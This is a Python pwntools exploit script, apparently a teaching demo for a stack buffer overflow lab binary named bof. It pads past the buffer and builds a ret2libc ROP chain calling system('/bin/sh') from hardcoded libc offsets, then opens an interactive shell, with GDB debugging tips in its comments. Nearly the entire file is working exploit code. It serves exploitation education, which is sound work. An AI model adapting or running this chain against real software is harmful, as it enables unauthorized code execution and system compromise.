#!/usr/bin/python

#Example Exploit for bof.c
#Author: Gregory Sanders (Ntropy)

from pwn import *

DEBUG = False #Change me to true to follow along!
binary = "/opt/ROPDemo/bof"
libc_loc = "/lib32/libc.so.6"

#ELF from pwn allows us to use dynamically find static addresses for functions.
e = ELF(binary)
libc = ELF(libc_loc)

libc_base = 0

#Launch process
p = process(binary)

"""Typically you would leak the location of libc during runtime,
    but ASLR is turned off on this server to give an easier time."""
if not DEBUG:
    libc_base = 0xf7e18000
else:
    """ A change in environment, like when debugging, can change where libraries load.
        In GDB, you can run `info proc` to get the process id of the target process,
        and then wait for the library to load, before running `shell cat /proc/<procid>/maps`.
        The first address for libc.so.6 will be where it has loaded."""
    libc_base = 0xf7e18000 
    print "run: gdb -p {}".format(p.pid)
    raw_input("Hit enter after attaching...")

"""
# Breakdown on debugging ROP chains
If now debugging, run:
    disas vulnerable
Set a breakpiont for the very end.
    ...
    0x08048513 <+143>:   leave
    0x08048514 <+144>:   ret
    ...
    break *0x8048514 #Or b*0x8048514
You can then just hit 'c' to continue until the breakpoint.
Remember to hit enter in the Python script.

A single instruction at a time, you can enter 'stepi' to first watch EDI fill
with the pointer to "/bin/sh", and then on the next return, system() should be
popped off of the stack, and called.

Hit 'c' again and at this point, you should be notified that a shell was spawned.
"""

#Build payload
payload = "A"*(28 + 4 ) #Overflow buffer, and stored framebuffer, just padding.

#Build ROP chain
pop_edi_ret = libc_base + 0x000177db
pop_edi_pop_ebp_ret = libc_base + 0x0006084d
binsh = libc_base + 0x15902b #Location of "/bin/sh\x00" in libc
system = libc_base + libc.symbols['system']

""" Stack based calling convention. """
rop = ""
rop += p32(system)
rop += p32(0x41414141) #Where it'd normally return after. Suggest POP, POP, RET to build further.
rop += p32(binsh)

""" Register-using calling convention 
rop += p32(pop_edi_ret)
rop += p32(binsh) #p32 packs your number into a 32-bit word in str representation.
rop += p32(libc_base + libc.symbols['system'])
"""

#Add ROP Chain to payload
payload += rop

#Overflow buffer
p.sendline(payload) 

#Launch ROP chain
p.sendline()
p.interactive()
